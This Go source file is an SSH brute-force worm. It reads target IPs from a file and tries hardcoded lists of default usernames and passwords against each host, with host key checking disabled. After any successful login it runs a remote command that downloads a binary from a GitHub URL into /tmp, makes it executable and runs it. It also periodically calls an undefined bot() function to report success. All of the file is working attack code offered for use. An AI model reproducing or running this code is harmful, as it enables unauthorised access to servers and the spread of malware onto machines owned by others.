package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)




func fun(ip string) {





	lista_users := []string{
                 

"root",
"admin",
"1234567",
"admin12345",
"toor",
"test",
"administrator",
"marketing",
"12345678",
"1234",
"12345",
"webadmin",
"webmaster",
"maintenance",
"techsupport",
"logon",
"alpine",
"ubuntu",
"linux",
"terminal",
"qwerty",
"password", 
"password123",
"kalilinux",
"debian",
"guest",

		

	}

	lista_pass := []string{
               	

"root",
"admin",
"1234567",
"admin12345",
"toor",
"test",
"administrator",
"12345678",
"1234",
"12345",
"webadmin",
"webmaster",
"maintenance",
"techsupport",
"logon"  ,
"alpine",
"ubuntu",
"linux",
"terminal",
"qwerty",
"password",
"password123",
"kalilinux",
"debian",
"guest",


}




	for _, user := range lista_users {
		for _, senha := range lista_pass {
			fmt.Println(ip)
			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(senha),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         5000  * time.Millisecond,

			}




			client, err := ssh.Dial("tcp",  ip  , config)

			if err != nil {
				fmt.Println("Failed to dial: ", err)
				continue

			}

			session, err := client.NewSession()
			if err != nil {
				fmt.Println(err)
				continue

			}


er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")


			fmt.Println(er)

			session.Close()

			client.Close()

		}


	}

}






func main() {


file, err := os.Open("ips")


if err != nil {

fmt.Println("Erro ao abrir arquivo:", err)

return

}



scanner := bufio.NewScanner(file)

      for scanner.Scan() {


		ip := scanner.Text()


		go fun(ip)


	}



for {



time.Sleep (10 * time.Second)


go  bot( "vkzmn  brute force ssh ok"  ) //notify bot  brute force ok


}

}
